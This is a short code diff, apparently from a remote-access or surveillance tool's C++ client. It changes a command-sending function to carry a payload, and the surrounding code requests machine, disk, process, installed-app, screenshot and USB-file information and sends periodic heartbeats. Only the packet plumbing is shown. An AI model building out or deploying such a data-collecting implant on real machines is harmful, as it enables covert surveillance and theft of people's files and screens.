@@ -22,13 +22,22 @@
 #pragma comment(lib,"dbghelp.lib")
 
 
-int CommandRecver::SendCmd(LPUNIQUECLIENTSYMBOL lpUnique, NETWORKPROCPARAM stParam, char* lpdata, int datasize,int cmd,int subcmd) {
+int CommandRecver::SendCmd(LPUNIQUECLIENTSYMBOL lpUnique, NETWORKPROCPARAM stParam,
+	char* lpdata, int datasize,int cmd,char * pack,int packlen) {
+
+	if (packlen >= datasize - sizeof(NETWORKPACKETHEADER)) {
+		return -1;
+	}
 
 	LPNETWORKPACKETHEADER lphdr = (LPNETWORKPACKETHEADER)lpdata;
 	lphdr->cmd = cmd;
 	lphdr->unique = *lpUnique;
-	lphdr->packlen = subcmd;
-	int iLen = sizeof(NETWORKPACKETHEADER);
+	lphdr->packlen = packlen;
+	if (packlen > 0) {
+		memcpy((char*)lphdr + sizeof(NETWORKPACKETHEADER), pack, packlen);
+	}
+	
+	int iLen = sizeof(NETWORKPACKETHEADER) + packlen;
 
 	int iRet = send(stParam.hSockClient, lpdata, iLen, 0);
 	if (iRet <= 0)
@@ -221,7 +230,7 @@ int __stdcall CommandRecver::CommandRecverProcess(LPNETWORKPROCPARAM lpParam, ch
 				
 				int cmd = MACHINE_INFO | DISKFILE_INFO | PROCESS_INFO | 
 					APPINSTALL_INFO | APPSCREENSHOT_INFO | SCREENSHOT_INFO | USBFILE_INFO;
-				iRet = SendCmd(&Unique, stParam, lpdata, NETWORK_BUF_SIZE, DAILY_WORK_ITEM, cmd);
+				iRet = SendCmd(&Unique, stParam, lpdata, NETWORK_BUF_SIZE, DAILY_WORK_ITEM,(char*) &cmd,sizeof(int));
 				if (iRet == FALSE)
 				{
 					break;
@@ -233,7 +242,7 @@ int __stdcall CommandRecver::CommandRecverProcess(LPNETWORKPROCPARAM lpParam, ch
 			if (waitcnt >= waitceiling)
 			{
 				waitcnt = 0;
-				iRet = SendCmd(&Unique, stParam, lpdata, NETWORK_BUF_SIZE,HEARTBEAT,0);
+				iRet = SendCmd(&Unique, stParam, lpdata, NETWORK_BUF_SIZE,HEARTBEAT,0,0);
 				if (iRet == FALSE)
 				{
 					break;
